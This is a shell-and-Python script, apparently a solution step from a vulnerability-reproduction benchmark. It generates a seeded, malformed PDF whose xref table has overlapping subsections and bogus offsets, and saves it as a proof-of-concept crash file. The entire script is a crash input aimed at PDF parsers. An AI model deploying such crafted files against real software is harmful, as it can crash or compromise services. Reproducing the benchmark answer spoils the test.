python3 - <<'PY'
import random
from pathlib import Path
rng = random.Random(0xC0DEC0DE)

def entry(offset, obj_type='n'):
    if obj_type == 'f':
        return b'0000000000 65535 f \n'
    return f'{offset % 10_000_000_000:010d} 00000 {obj_type} \n'.encode()

def generate(iteration):
    max_obj = rng.randint(8, 80)
    root = rng.randint(1, max_obj - 1)
    data = bytearray(b'%PDF-1.4\n')
    pad = rng.randrange(0, 2048)
    if pad:
        data += b'%' + bytes([65 + iteration % 26]) * pad + b'\n'
    offsets = {}
    for obj in range(1, max_obj):
        offsets[obj] = len(data)
        if obj == root:
            body = b'<< /Type /Catalog >>'
        else:
            choice = rng.randrange(4)
            if choice == 0:
                body = b'null'
            elif choice == 1:
                body = f'({obj:08d})'.encode()
            elif choice == 2:
                body = b'<< >>'
            else:
                body = b'[]'
        data += f'{obj} 0 obj\n'.encode() + body + b'\nendobj\n'
    xref = len(data)
    data += b'xref\n'
    base_start = rng.randrange(0, max_obj // 2)
    base_len = rng.randrange(1, min(16, max_obj - base_start))
    overlap_start = rng.randrange(base_start, base_start + base_len)
    overlap_len = rng.randrange(base_start + base_len - overlap_start + 1,
                                min(max_obj - overlap_start, base_len + 20) + 1)
    sections = [(base_start, base_len), (overlap_start, overlap_len)]
    for _ in range(rng.randrange(0, 9)):
        start = rng.randrange(0, max_obj)
        length = rng.randrange(1, min(24, max_obj - start) + 1)
        sections.append((start, length))
    if rng.random() < 0.7:
        rng.shuffle(sections[2:])
    for start, length in sections:
        data += f'{start} {length}\n'.encode()
        for obj in range(start, start + length):
            obj_type = 'f' if obj == 0 or rng.random() < 0.08 else 'n'
            off = offsets.get(obj, rng.randrange(0, max(1, len(data))))
            if rng.random() < 0.04:
                off = rng.randrange(0, 1 << 32)
            data += entry(off, obj_type)
    data += f'trailer\n<< /Size {max_obj} /Root {root} 0 R >>\nstartxref\n{xref}\n%%EOF\n'.encode()
    return bytes(data)

blob = None
for iteration in range(277):
    blob = generate(iteration)
Path('/CybinGym_workdir/poc_crash').write_bytes(blob)
PY
chmod 0644 /CybinGym_workdir/poc_crash
wc -c /CybinGym_workdir/poc_crash
sha256sum /CybinGym_workdir/poc_crash
file /CybinGym_workdir/poc_crash
